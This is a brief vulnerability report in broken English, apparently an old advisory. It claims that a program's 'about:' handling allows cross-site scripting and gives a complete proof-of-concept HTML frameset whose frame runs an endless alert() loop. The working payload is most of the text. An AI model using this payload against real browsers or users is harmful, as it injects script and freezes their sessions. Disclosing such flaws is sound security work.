The program is vulnerable to attacks of the kind xss the parameter "about:" scripts without authorization in the example that I am presenting is a page that runs a while with a msgbox infinity.

Create an html file and paste the following code

<html>

<frameset rows="100%">

  <frame src="about:<script>while(1)alert("Juan Pablo Lopez Yacubian")</script>">


</frameset>

</html>
